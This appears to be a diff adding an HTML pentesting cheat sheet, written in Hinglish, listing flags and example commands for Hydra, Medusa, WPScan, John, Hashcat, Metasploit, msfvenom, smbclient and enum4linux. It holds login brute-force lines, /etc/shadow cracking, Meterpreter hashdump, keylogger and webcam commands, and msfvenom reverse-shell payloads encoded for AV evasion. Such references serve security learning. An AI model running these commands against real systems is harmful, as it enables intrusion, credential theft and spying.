+<tr><td>-c 50</td><td>Concurrency</td><td>Parallel requests</td></tr>
+<tr><td>-o output.txt</td><td>Output</td><td>Output save karo</td></tr>
+<tr><td>-json</td><td>JSON</td><td>JSON output</td></tr>
+<tr><td>-silent</td><td>Silent</td><td>Sirf findings dikhao</td></tr>
+<tr><td>-update-templates</td><td>Update</td><td>Latest templates download karo</td></tr>
+<tr><td>-H "Header: val"</td><td>Header</td><td>Custom header</td></tr>
+<tr><td>-proxy http://127.0.0.1:8080</td><td>Proxy</td><td>Burp proxy</td></tr>
+<tr><td>-stats</td><td>Stats</td><td>Statistics dikhao</td></tr>
+<tr><td>-debug</td><td>Debug</td><td>Debug mode</td></tr>
+<tr><td>-nc</td><td>NoColor</td><td>Color disable karo</td></tr>
+</table>
+</div>
+
+</div><!-- vuln -->
+
+<!-- ═══ BRUTE FORCE ═══ -->
+<div class="sheet" id="s-brute">
+
+<div class="tool">
+<div class="tool-title"><h2>🔨 HYDRA</h2><span class="cat c-r">Brute Force</span></div>
+<div class="tool-desc">Network login brute force — SSH, FTP, HTTP, SMB, RDP, MySQL, 50+ protocols support</div>
+<div class="install"><b>Install:</b> sudo apt install hydra</div>
+<table>
+<tr><th>Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── CREDENTIALS ──</td></tr>
+<tr><td>-l username</td><td>User</td><td>Single username</td></tr>
+<tr><td>-L users.txt</td><td>UserList</td><td>Username list file</td></tr>
+<tr><td>-p password</td><td>Pass</td><td>Single password</td></tr>
+<tr><td>-P passwords.txt</td><td>PassList</td><td>Password list file</td></tr>
+<tr><td>-C creds.txt</td><td>Combo</td><td>user:pass format file</td></tr>
+<tr><td>-e nsr</td><td>Extra</td><td>n=null pass, s=user as pass, r=reverse user</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── CONNECTION ──</td></tr>
+<tr><td>-s PORT</td><td>Port</td><td>Custom port (default service port)</td></tr>
+<tr><td>-t 16</td><td>Tasks</td><td>Parallel tasks/threads (default 16)</td></tr>
+<tr><td>-w 30</td><td>Wait</td><td>Response wait timeout seconds</td></tr>
+<tr><td>-c 5</td><td>Wait</td><td>Seconds between each connection</td></tr>
+<tr><td>-R</td><td>Restore</td><td>Interrupted session restore karo</td></tr>
+<tr><td>-S</td><td>SSL</td><td>SSL/TLS connection</td></tr>
+<tr><td>-4 / -6</td><td>IP</td><td>IPv4 / IPv6 force</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── OUTPUT ──</td></tr>
+<tr><td>-V</td><td>Verbose</td><td>Har attempt dikhao</td></tr>
+<tr><td>-v</td><td>Verbose</td><td>Less verbose</td></tr>
+<tr><td>-f</td><td>Stop</td><td>Pehla match milte hi stop</td></tr>
+<tr><td>-F</td><td>Stop</td><td>Kisi bhi host pe match milne pe stop</td></tr>
+<tr><td>-o output.txt</td><td>Output</td><td>Found credentials save karo</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── HTTP FORM ──</td></tr>
+<tr><td>http-post-form</td><td>Module</td><td>HTTP POST form brute force</td></tr>
+<tr><td>"/path:body:fail_str"</td><td>Format</td><td>path = URL, body = POST data (^USER^ ^PASS^), fail_str = failed login indicator</td></tr>
+<tr><td>http-get-form</td><td>Module</td><td>HTTP GET form</td></tr>
+<tr><td>http-get</td><td>Module</td><td>HTTP Basic Auth</td></tr>
+</table>
+<div class="ex-block">
+<div class="ex-label">⚡ Service-wise Commands</div>
+<div class="ex">hydra <span class="f">-l</span> admin <span class="f">-P</span> rockyou.txt TARGET ssh</div>
+<div class="ex">hydra <span class="f">-l</span> admin <span class="f">-P</span> rockyou.txt TARGET ftp</div>
+<div class="ex">hydra <span class="f">-L</span> users.txt <span class="f">-P</span> pass.txt TARGET smb</div>
+<div class="ex">hydra <span class="f">-l</span> admin <span class="f">-P</span> rockyou.txt TARGET rdp</div>
+<div class="ex">hydra <span class="f">-l</span> root <span class="f">-P</span> rockyou.txt TARGET mysql</div>
+<div class="ex"><span class="c"># HTTP POST form — login failure string important hai!</span>
+hydra <span class="f">-l</span> admin <span class="f">-P</span> rockyou.txt TARGET http-post-form <span class="a">"/login.php:user=^USER^&pass=^PASS^:Invalid credentials"</span></div>
+</div>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>🐍 MEDUSA</h2><span class="cat c-r">Brute Force</span></div>
+<div class="tool-desc">Hydra ka parallel alternative — modular design, stable</div>
+<div class="install"><b>Install:</b> sudo apt install medusa</div>
+<table>
+<tr><th>Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td>-h HOST</td><td>Host</td><td>Single target</td></tr>
+<tr><td>-H hosts.txt</td><td>Hosts</td><td>Multiple hosts file</td></tr>
+<tr><td>-u username</td><td>User</td><td>Single username</td></tr>
+<tr><td>-U users.txt</td><td>Users</td><td>Username list</td></tr>
+<tr><td>-p password</td><td>Pass</td><td>Single password</td></tr>
+<tr><td>-P pass.txt</td><td>Passes</td><td>Password list</td></tr>
+<tr><td>-C creds.txt</td><td>Combo</td><td>user:pass combo file</td></tr>
+<tr><td>-M module</td><td>Module</td><td>Protocol — ssh/ftp/http/smb/mysql/rdp/telnet</td></tr>
+<tr><td>-n PORT</td><td>Port</td><td>Custom port</td></tr>
+<tr><td>-t 4</td><td>Tasks</td><td>Parallel tasks per host</td></tr>
+<tr><td>-T 5</td><td>Hosts</td><td>Parallel hosts</td></tr>
+<tr><td>-f</td><td>Stop</td><td>Host pe found hote hi stop</td></tr>
+<tr><td>-F</td><td>Stop</td><td>Kisi bhi host pe found hote hi stop (global)</td></tr>
+<tr><td>-v 6</td><td>Verbose</td><td>Verbosity level 0-6</td></tr>
+<tr><td>-O output</td><td>Output</td><td>Output file</td></tr>
+<tr><td>-s</td><td>SSL</td><td>SSL enable karo</td></tr>
+</table>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>🔍 WPSCAN</h2><span class="cat c-y">WordPress</span></div>
+<div class="tool-desc">WordPress vulnerability scanner — themes, plugins, users, misconfigs</div>
+<div class="install"><b>Install:</b> sudo apt install wpscan  |  gem install wpscan</div>
+<table>
+<tr><th>Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td>--url URL</td><td>Target</td><td>WordPress site URL</td></tr>
+<tr><td>-e u</td><td>Enum</td><td>Users enumerate karo</td></tr>
+<tr><td>-e p</td><td>Enum</td><td>Plugins enumerate karo</td></tr>
+<tr><td>-e t</td><td>Enum</td><td>Themes enumerate karo</td></tr>
+<tr><td>-e ap</td><td>Enum</td><td>All plugins</td></tr>
+<tr><td>-e at</td><td>Enum</td><td>All themes</td></tr>
+<tr><td>-U username</td><td>BF User</td><td>Specific user ke liye brute force</td></tr>
+<tr><td>-P wordlist</td><td>BF Pass</td><td>Password wordlist</td></tr>
+<tr><td>--api-token TOKEN</td><td>API</td><td>WPScan API token — vulnerability data ke liye</td></tr>
+<tr><td>--detection-mode a</td><td>Mode</td><td>Detection mode — passive/aggressive/mixed</td></tr>
+<tr><td>-o output</td><td>Output</td><td>Output file</td></tr>
+<tr><td>--format json</td><td>Format</td><td>JSON output</td></tr>
+<tr><td>--proxy http://127.0.0.1:8080</td><td>Proxy</td><td>Burp proxy</td></tr>
+<tr><td>--disable-tls-checks</td><td>SSL</td><td>SSL check disable</td></tr>
+<tr><td>-t 20</td><td>Threads</td><td>Threads</td></tr>
+</table>
+</div>
+
+</div><!-- brute -->
+
+<!-- ═══ HASH CRACKING ═══ -->
+<div class="sheet" id="s-hash">
+
+<div class="tool">
+<div class="tool-title"><h2>🔑 JOHN THE RIPPER</h2><span class="cat c-p">Hash Crack</span></div>
+<div class="tool-desc">Password hash cracker — MD5, SHA, NTLM, bcrypt, zip, SSH, PDF, Office files</div>
+<div class="install"><b>Install:</b> sudo apt install john  |  snap install john-the-ripper</div>
+<table>
+<tr><th>Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── BASIC ──</td></tr>
+<tr><td>--wordlist=file</td><td>Mode</td><td>Wordlist attack — rockyou.txt use karo</td></tr>
+<tr><td>--rules</td><td>Rules</td><td>Default rules apply karo (variations generate)</td></tr>
+<tr><td>--rules=Jumbo</td><td>Rules</td><td>Jumbo ruleset — zyada variations</td></tr>
+<tr><td>--single</td><td>Mode</td><td>Single crack mode — username based variations</td></tr>
+<tr><td>--incremental</td><td>Mode</td><td>Brute force mode — sabhi combinations</td></tr>
+<tr><td>--incremental=Alpha</td><td>Mode</td><td>Sirf alphabet characters</td></tr>
+<tr><td>--incremental=Digits</td><td>Mode</td><td>Sirf numbers</td></tr>
+<tr><td>--format=TYPE</td><td>Format</td><td>Hash format specify karo (neeche table mein)</td></tr>
+<tr><td>--show</td><td>Show</td><td>Already cracked passwords dikhao</td></tr>
+<tr><td>--users=username</td><td>User</td><td>Specific user crack karo</td></tr>
+<tr><td>--pot=file</td><td>Pot</td><td>Custom potfile use karo</td></tr>
+<tr><td>--list=formats</td><td>List</td><td>Sab supported formats dikhao</td></tr>
+<tr><td>--fork=4</td><td>CPU</td><td>4 CPU cores use karo</td></tr>
+<tr><td>-mask=?a?a?a?a</td><td>Mask</td><td>Mask attack — ?a=all chars ?l=lower ?u=upper ?d=digit</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── COMMON FORMATS ──</td></tr>
+<tr><td>Raw-MD5</td><td>Format</td><td>MD5: d8578edf8458ce06fbc5bb76a58c5ca4</td></tr>
+<tr><td>Raw-SHA1</td><td>Format</td><td>SHA1: da39a3ee5e6b4b0d3255bfef95601890afd80709</td></tr>
+<tr><td>Raw-SHA256</td><td>Format</td><td>SHA256: e3b0c44298fc1c149afbf...</td></tr>
+<tr><td>NT</td><td>Format</td><td>Windows NTLM hashes</td></tr>
+<tr><td>md5crypt</td><td>Format</td><td>Linux $1$ hashes</td></tr>
+<tr><td>sha512crypt</td><td>Format</td><td>Linux $6$ hashes (most common)</td></tr>
+<tr><td>bcrypt</td><td>Format</td><td>$2a$ $2b$ hashes</td></tr>
+<tr><td>zip</td><td>Format</td><td>ZIP password (use zip2john first)</td></tr>
+<tr><td>rar</td><td>Format</td><td>RAR password</td></tr>
+<tr><td>ssh</td><td>Format</td><td>SSH key (use ssh2john first)</td></tr>
+<tr><td>pdf</td><td>Format</td><td>PDF password (use pdf2john first)</td></tr>
+<tr><td>office</td><td>Format</td><td>Office docs (use office2john first)</td></tr>
+<tr><td>keepass</td><td>Format</td><td>KeePass database</td></tr>
+<tr><td>krb5tgs</td><td>Format</td><td>Kerberoast TGS hashes</td></tr>
+<tr><td>krb5asrep</td><td>Format</td><td>AS-REP roast hashes</td></tr>
+</table>
+<div class="ex-block">
+<div class="ex-label">⚡ Common John Commands</div>
+<div class="ex"><span class="c"># Basic wordlist</span>
+john <span class="f">--wordlist=</span>/usr/share/wordlists/rockyou.txt hash.txt</div>
+<div class="ex"><span class="c"># Format specify karo</span>
+john <span class="f">--wordlist=</span>rockyou.txt <span class="f">--format=</span>Raw-SHA256 hash.txt</div>
+<div class="ex"><span class="c"># SSH private key crack</span>
+ssh2john id_rsa > id_rsa.hash
+john <span class="f">--wordlist=</span>rockyou.txt id_rsa.hash</div>
+<div class="ex"><span class="c"># ZIP crack</span>
+zip2john secret.zip > zip.hash
+john <span class="f">--wordlist=</span>rockyou.txt zip.hash</div>
+<div class="ex"><span class="c"># Linux /etc/shadow</span>
+unshadow /etc/passwd /etc/shadow > combined.txt
+john <span class="f">--wordlist=</span>rockyou.txt combined.txt</div>
+<div class="ex"><span class="c"># Show cracked</span>
+john hash.txt <span class="f">--show</span></div>
+</div>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>⚡ HASHCAT</h2><span class="cat c-p">Hash Crack</span></div>
+<div class="tool-desc">World fastest GPU hash cracker — John se zyada fast, complex hashes ke liye</div>
+<div class="install"><b>Install:</b> sudo apt install hashcat</div>
+<table>
+<tr><th>Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── BASIC ──</td></tr>
+<tr><td>-m MODE</td><td>Mode</td><td>Hash type (neeche table dekho)</td></tr>
+<tr><td>-a MODE</td><td>Attack</td><td>0=dict, 1=combo, 3=brute, 6=dict+mask, 7=mask+dict</td></tr>
+<tr><td>-o output.txt</td><td>Output</td><td>Cracked passwords save karo</td></tr>
+<tr><td>--show</td><td>Show</td><td>Cracked passwords dikhao</td></tr>
+<tr><td>--force</td><td>Force</td><td>Warnings ignore karo</td></tr>
+<tr><td>--potfile-disable</td><td>Pot</td><td>Potfile use mat karo</td></tr>
+<tr><td>-r rules.rule</td><td>Rules</td><td>Rules file — variations generate karo</td></tr>
+<tr><td>--status</td><td>Status</td><td>Progress show karo</td></tr>
+<tr><td>-d 1</td><td>Device</td><td>Device select karo (GPU=1)</td></tr>
+<tr><td>--opencl-device-types 1,2</td><td>Type</td><td>1=CPU, 2=GPU</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── ATTACK MODES (-a) ──</td></tr>
+<tr><td>-a 0 wordlist</td><td>Dict</td><td>Dictionary attack — most common</td></tr>
+<tr><td>-a 3 ?a?a?a?a</td><td>Brute</td><td>Brute force with mask</td></tr>
+<tr><td>-a 6 wordlist ?d?d</td><td>Hybrid</td><td>Wordlist + mask (word + 2 digits)</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── MASK CHARS ──</td></tr>
+<tr><td>?l</td><td>Mask</td><td>Lowercase: abcdefghijklmnopqrstuvwxyz</td></tr>
+<tr><td>?u</td><td>Mask</td><td>Uppercase: ABCDEFGHIJKLMNOPQRSTUVWXYZ</td></tr>
+<tr><td>?d</td><td>Mask</td><td>Digits: 0123456789</td></tr>
+<tr><td>?s</td><td>Mask</td><td>Special: !"#$%&'()*+,...etc</td></tr>
+<tr><td>?a</td><td>Mask</td><td>All printable: ?l?u?d?s combined</td></tr>
+<tr><td>?b</td><td>Mask</td><td>All 0x00-0xff</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── HASH MODES (-m) ──</td></tr>
+<tr><td>0</td><td>MD5</td><td>d8578edf8458ce06...</td></tr>
+<tr><td>100</td><td>SHA1</td><td>da39a3ee5e6b4b0d...</td></tr>
+<tr><td>1400</td><td>SHA256</td><td>e3b0c44298fc1c14...</td></tr>
+<tr><td>1700</td><td>SHA512</td><td>cf83e1357eefb8bd...</td></tr>
+<tr><td>900</td><td>MD4</td><td>MD4 hash</td></tr>
+<tr><td>1000</td><td>NTLM</td><td>Windows NTLM hashes</td></tr>
+<tr><td>3000</td><td>LM</td><td>Windows LM hashes (old)</td></tr>
+<tr><td>500</td><td>md5crypt</td><td>Linux $1$ hashes</td></tr>
+<tr><td>1800</td><td>sha512crypt</td><td>Linux $6$ hashes</td></tr>
+<tr><td>3200</td><td>bcrypt</td><td>$2a$ $2b$ hashes — slow!</td></tr>
+<tr><td>5600</td><td>NetNTLMv2</td><td>Responder se capture — crack karo</td></tr>
+<tr><td>5500</td><td>NetNTLMv1</td><td>Older Windows NTLM</td></tr>
+<tr><td>13100</td><td>Kerberoast</td><td>Kerberos TGS-REP hashes</td></tr>
+<tr><td>18200</td><td>AS-REP</td><td>AS-REP Roast hashes</td></tr>
+<tr><td>16500</td><td>JWT</td><td>JSON Web Tokens</td></tr>
+<tr><td>11600</td><td>7-Zip</td><td>7-Zip archives</td></tr>
+<tr><td>13600</td><td>WinZip</td><td>WinZip AES</td></tr>
+</table>
+<div class="ex-block">
+<div class="ex-label">⚡ Common Commands</div>
+<div class="ex">hashcat <span class="f">-m</span> 0 hash.txt rockyou.txt <span class="c">              # MD5</span></div>
+<div class="ex">hashcat <span class="f">-m</span> 1000 ntlm.hash rockyou.txt <span class="c">         # NTLM</span></div>
+<div class="ex">hashcat <span class="f">-m</span> 5600 responder.hash rockyou.txt <span class="c">    # NetNTLMv2</span></div>
+<div class="ex">hashcat <span class="f">-m</span> 13100 kerberoast.txt rockyou.txt <span class="c">  # Kerberoast</span></div>
+<div class="ex">hashcat <span class="f">-m</span> 0 hash.txt rockyou.txt <span class="f">-r</span> /usr/share/hashcat/rules/best64.rule</div>
+<div class="ex">hashcat <span class="f">-m</span> 0 hash.txt <span class="f">-a</span> 3 <span class="a">?u?l?l?l?d?d?d?d</span> <span class="c"> # Mask: Abc1234</span></div>
+</div>
+</div>
+
+</div><!-- hash -->
+
+<!-- ═══ METASPLOIT ═══ -->
+<div class="sheet" id="s-exploit">
+
+<div class="tool">
+<div class="tool-title"><h2>💣 METASPLOIT — msfconsole</h2><span class="cat c-b">Exploit</span></div>
+<div class="tool-desc">World's most famous exploitation framework — thousands of exploits, payloads, auxiliary modules</div>
+<table>
+<tr><th>Command</th><th>Context</th><th>Matlab / Use</th></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── NAVIGATION ──</td></tr>
+<tr><td>msfconsole</td><td>Terminal</td><td>MSF shuru karo</td></tr>
+<tr><td>msfconsole -q</td><td>Terminal</td><td>Quiet mode — banner nahi</td></tr>
+<tr><td>search keyword</td><td>MSF</td><td>Exploit/module search karo</td></tr>
+<tr><td>search type:exploit platform:windows</td><td>MSF</td><td>Type aur platform filter</td></tr>
+<tr><td>use module/path</td><td>MSF</td><td>Module select karo</td></tr>
+<tr><td>use 0</td><td>MSF</td><td>Search result number se select karo</td></tr>
+<tr><td>info</td><td>Module</td><td>Module ki full information</td></tr>
+<tr><td>show options</td><td>Module</td><td>Required aur optional options dikhao</td></tr>
+<tr><td>show payloads</td><td>Module</td><td>Compatible payloads list</td></tr>
+<tr><td>show targets</td><td>Module</td><td>Supported targets list</td></tr>
+<tr><td>back</td><td>Module</td><td>Module se bahar jao</td></tr>
+<tr><td>previous</td><td>MSF</td><td>Pichle module pe wapas jao</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── OPTIONS SET KARNA ──</td></tr>
+<tr><td>set RHOSTS 10.10.10.1</td><td>Module</td><td>Target IP set karo</td></tr>
+<tr><td>set RHOSTS 10.10.10.0/24</td><td>Module</td><td>Subnet set karo</td></tr>
+<tr><td>set RPORT 8080</td><td>Module</td><td>Target port</td></tr>
+<tr><td>set LHOST 10.10.14.1</td><td>Module</td><td>Apni IP (listener ke liye)</td></tr>
+<tr><td>set LPORT 4444</td><td>Module</td><td>Listener port</td></tr>
+<tr><td>set USERNAME admin</td><td>Module</td><td>Username set karo</td></tr>
+<tr><td>set PASSWORD pass123</td><td>Module</td><td>Password set karo</td></tr>
+<tr><td>set PAYLOAD windows/x64/shell_reverse_tcp</td><td>Module</td><td>Payload set karo</td></tr>
+<tr><td>set TARGET 1</td><td>Module</td><td>Target index select karo</td></tr>
+<tr><td>setg RHOSTS 10.10.10.1</td><td>MSF</td><td>Global set — sab modules ke liye</td></tr>
+<tr><td>unset OPTION</td><td>Module</td><td>Option unset karo</td></tr>
+<tr><td>unset all</td><td>Module</td><td>Sab options clear karo</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── RUN ──</td></tr>
+<tr><td>run / exploit</td><td>Module</td><td>Exploit launch karo</td></tr>
+<tr><td>run -j</td><td>Module</td><td>Background job ke roop mein run karo</td></tr>
+<tr><td>check</td><td>Module</td><td>Target vulnerable hai kya check karo (safe)</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── SESSIONS ──</td></tr>
+<tr><td>sessions</td><td>MSF</td><td>Sab active sessions list karo</td></tr>
+<tr><td>sessions -l</td><td>MSF</td><td>Sessions list (detailed)</td></tr>
+<tr><td>sessions -i 1</td><td>MSF</td><td>Session 1 pe interact karo</td></tr>
+<tr><td>sessions -k 1</td><td>MSF</td><td>Session 1 kill karo</td></tr>
+<tr><td>sessions -u 1</td><td>MSF</td><td>Session 1 ko meterpreter mein upgrade</td></tr>
+<tr><td>background / Ctrl+Z</td><td>Session</td><td>Session background mein daalo</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── METERPRETER COMMANDS ──</td></tr>
+<tr><td>sysinfo</td><td>Meterp</td><td>System information</td></tr>
+<tr><td>getuid</td><td>Meterp</td><td>Current user</td></tr>
+<tr><td>getsystem</td><td>Meterp</td><td>SYSTEM privileges lene ki koshish</td></tr>
+<tr><td>getpid</td><td>Meterp</td><td>Current process ID</td></tr>
+<tr><td>ps</td><td>Meterp</td><td>Running processes list</td></tr>
+<tr><td>migrate PID</td><td>Meterp</td><td>Doosre process mein migrate karo</td></tr>
+<tr><td>shell</td><td>Meterp</td><td>OS shell open karo</td></tr>
+<tr><td>hashdump</td><td>Meterp</td><td>Windows password hashes dump karo</td></tr>
+<tr><td>upload src dst</td><td>Meterp</td><td>File upload karo</td></tr>
+<tr><td>download src</td><td>Meterp</td><td>File download karo</td></tr>
+<tr><td>ls / dir</td><td>Meterp</td><td>Files list karo</td></tr>
+<tr><td>cd path</td><td>Meterp</td><td>Directory change</td></tr>
+<tr><td>pwd</td><td>Meterp</td><td>Current directory</td></tr>
+<tr><td>cat file</td><td>Meterp</td><td>File content dekho</td></tr>
+<tr><td>search -f *.txt</td><td>Meterp</td><td>Files search karo</td></tr>
+<tr><td>keyscan_start</td><td>Meterp</td><td>Keylogger start karo</td></tr>
+<tr><td>keyscan_dump</td><td>Meterp</td><td>Captured keys dump karo</td></tr>
+<tr><td>screenshot</td><td>Meterp</td><td>Screenshot lo</td></tr>
+<tr><td>webcam_snap</td><td>Meterp</td><td>Webcam se photo lo</td></tr>
+<tr><td>run autoroute -s SUBNET</td><td>Meterp</td><td>Pivot route add karo</td></tr>
+<tr><td>portfwd add -l 8080 -r 127.0.0.1 -p 80</td><td>Meterp</td><td>Port forward karo</td></tr>
+<tr><td>load kiwi</td><td>Meterp</td><td>Mimikatz (kiwi) load karo</td></tr>
+<tr><td>creds_all</td><td>Kiwi</td><td>Sab credentials dump (kiwi)</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── MSF UTILITIES ──</td></tr>
+<tr><td>msfvenom</td><td>External</td><td>Standalone payload generator</td></tr>
+<tr><td>db_nmap -sV TARGET</td><td>MSF</td><td>Nmap results DB mein save karo</td></tr>
+<tr><td>hosts</td><td>MSF</td><td>DB mein saved hosts</td></tr>
+<tr><td>services</td><td>MSF</td><td>DB mein saved services</td></tr>
+<tr><td>vulns</td><td>MSF</td><td>DB mein saved vulnerabilities</td></tr>
+<tr><td>workspace</td><td>MSF</td><td>Workspaces manage karo</td></tr>
+</table>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>🎭 MSFVENOM</h2><span class="cat c-b">Payload Gen</span></div>
+<div class="tool-desc">Custom shellcode aur payload generator — exe, elf, php, asp, dll sab formats</div>
+<table>
+<tr><th>Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td>-p PAYLOAD</td><td>Payload</td><td>Payload type select karo</td></tr>
+<tr><td>LHOST=IP</td><td>Option</td><td>Listener IP (apni Kali IP)</td></tr>
+<tr><td>LPORT=4444</td><td>Option</td><td>Listener port</td></tr>
+<tr><td>-f FORMAT</td><td>Format</td><td>Output format — exe/elf/php/asp/raw/python</td></tr>
+<tr><td>-o file</td><td>Output</td><td>Output file path</td></tr>
+<tr><td>-e ENCODER</td><td>Encoder</td><td>Encoder use karo — x86/shikata_ga_nai</td></tr>
+<tr><td>-i 5</td><td>Iterations</td><td>Encoding iterations (AV bypass)</td></tr>
+<tr><td>-b "\x00\x0a"</td><td>BadChars</td><td>Bad characters avoid karo</td></tr>
+<tr><td>-a x64</td><td>Arch</td><td>Architecture — x86/x64/x86_64</td></tr>
+<tr><td>--platform windows</td><td>Platform</td><td>Platform — windows/linux/osx</td></tr>
+<tr><td>-l payloads</td><td>List</td><td>Sab payloads list karo</td></tr>
+<tr><td>-l encoders</td><td>List</td><td>Sab encoders list karo</td></tr>
+<tr><td>-l formats</td><td>List</td><td>Sab formats list karo</td></tr>
+</table>
+<div class="ex-block">
+<div class="ex-label">⚡ Common Payloads</div>
+<div class="ex"><span class="c"># Windows EXE reverse shell</span>
+msfvenom <span class="f">-p</span> windows/x64/meterpreter/reverse_tcp <span class="a">LHOST=IP LPORT=4444</span> <span class="f">-f</span> exe <span class="f">-o</span> shell.exe</div>
+<div class="ex"><span class="c"># Linux ELF</span>
+msfvenom <span class="f">-p</span> linux/x64/shell_reverse_tcp <span class="a">LHOST=IP LPORT=4444</span> <span class="f">-f</span> elf <span class="f">-o</span> shell</div>
+<div class="ex"><span class="c"># PHP web shell</span>
+msfvenom <span class="f">-p</span> php/meterpreter_reverse_tcp <span class="a">LHOST=IP LPORT=4444</span> <span class="f">-f</span> raw <span class="f">-o</span> shell.php</div>
+<div class="ex"><span class="c"># ASP.NET</span>
+msfvenom <span class="f">-p</span> windows/x64/shell_reverse_tcp <span class="a">LHOST=IP LPORT=4444</span> <span class="f">-f</span> aspx <span class="f">-o</span> shell.aspx</div>
+<div class="ex"><span class="c"># Stageless (sirf ek connection)</span>
+msfvenom <span class="f">-p</span> linux/x64/<span class="a">shell_reverse_tcp</span> <span class="c">  # underscore = stageless</span></div>
+<div class="ex"><span class="c"># Staged (MSF listener chahiye)</span>
+msfvenom <span class="f">-p</span> linux/x64/<span class="a">shell/reverse_tcp</span> <span class="c">  # slash = staged</span></div>
+</div>
+</div>
+
+</div><!-- exploit -->
+
+<!-- ═══ SMB/WINDOWS ═══ -->
+<div class="sheet" id="s-smb">
+
+<div class="tool">
+<div class="tool-title"><h2>📁 SMBCLIENT</h2><span class="cat c-g">SMB</span><span class="port">Port 445/139</span></div>
+<div class="tool-desc">SMB shares se connect karo — files upload/download, FTP jaisa interface</div>
+<table>
+<tr><th>Flag / Command</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── CONNECTION FLAGS ──</td></tr>
+<tr><td>-L //IP</td><td>List</td><td>Available shares list karo</td></tr>
+<tr><td>-N</td><td>NoPass</td><td>No password — anonymous access try karo</td></tr>
+<tr><td>-U username</td><td>User</td><td>Username specify karo</td></tr>
+<tr><td>-U domain\user</td><td>Domain</td><td>Domain user</td></tr>
+<tr><td>--password=pass</td><td>Pass</td><td>Password</td></tr>
+<tr><td>-W DOMAIN</td><td>Domain</td><td>Workgroup/Domain specify karo</td></tr>
+<tr><td>-p PORT</td><td>Port</td><td>Custom port (default 445)</td></tr>
+<tr><td>-I IP</td><td>IP</td><td>Direct IP connect</td></tr>
+<tr><td>--signing=off</td><td>Sign</td><td>SMB signing disable karo</td></tr>
+<tr><td colspan="3" style="color:#555;font-size:10px;padding:6px 10px;background:#0a0d12">── INSIDE SHELL COMMANDS ──</td></tr>
+<tr><td>ls / dir</td><td>Shell</td><td>Files aur folders list karo</td></tr>
+<tr><td>cd foldername</td><td>Shell</td><td>Folder mein jao</td></tr>
+<tr><td>get filename</td><td>Shell</td><td>File download karo</td></tr>
+<tr><td>mget *</td><td>Shell</td><td>Sab files download karo</td></tr>
+<tr><td>put filename</td><td>Shell</td><td>File upload karo</td></tr>
+<tr><td>mput *</td><td>Shell</td><td>Multiple files upload</td></tr>
+<tr><td>del filename</td><td>Shell</td><td>File delete karo</td></tr>
+<tr><td>mkdir name</td><td>Shell</td><td>Directory banao</td></tr>
+<tr><td>rmdir name</td><td>Shell</td><td>Directory remove karo</td></tr>
+<tr><td>pwd</td><td>Shell</td><td>Current SMB path</td></tr>
+<tr><td>prompt off</td><td>Shell</td><td>mget ke liye confirmation band karo</td></tr>
+<tr><td>recurse on</td><td>Shell</td><td>Recursive operations enable karo</td></tr>
+<tr><td>mask ""</td><td>Shell</td><td>mget ke liye mask set karo (sab files)</td></tr>
+<tr><td>exit / quit</td><td>Shell</td><td>Shell se bahar jao</td></tr>
+</table>
+<div class="ex-block">
+<div class="ex-label">⚡ Common Commands</div>
+<div class="ex"><span class="c"># Shares list — anonymous</span>
+smbclient <span class="f">-L</span> //10.10.10.1 <span class="f">-N</span></div>
+<div class="ex"><span class="c"># Connect to share</span>
+smbclient //10.10.10.1/sharename <span class="f">-U</span> "admin%password"</div>
+<div class="ex"><span class="c"># Recursive download sab files</span>
+smbclient //IP/share <span class="f">-N</span> <span class="f">-c</span> "prompt off; recurse on; mget *"</div>
+</div>
+</div>
+
+<div class="tool">
+<div class="tool-title"><h2>🔎 ENUM4LINUX</h2><span class="cat c-g">SMB Enum</span></div>
+<div class="tool-desc">SMB/Samba se sab information nikalo — users, groups, shares, password policy</div>
+<table>
+<tr><th>Flag</th><th>Type</th><th>Matlab / Use</th></tr>
+<tr><td>-a</td><td>All</td><td>Sab enumeration do — full scan</td></tr>
+<tr><td>-U</td><td>Users</td><td>Sirf users list karo</td></tr>
+<tr><td>-S</td><td>Shares</td><td>Sirf shares list karo</td></tr>
+<tr><td>-G</td><td>Groups</td><td>Groups list karo</td></tr>
+<tr><td>-P</td><td>Policy</td><td>Password policy dekho</td></tr>
+<tr><td>-o</td><td>OS</td><td>OS information</td></tr>
+<tr><td>-i</td><td>Printer</td><td>Printers list karo</td></tr>
+<tr><td>-u username</td><td>User</td><td>Username credentials ke saath</td></tr>
+<tr><td>-p password</td><td>Pass</td><td>Password</td></tr>
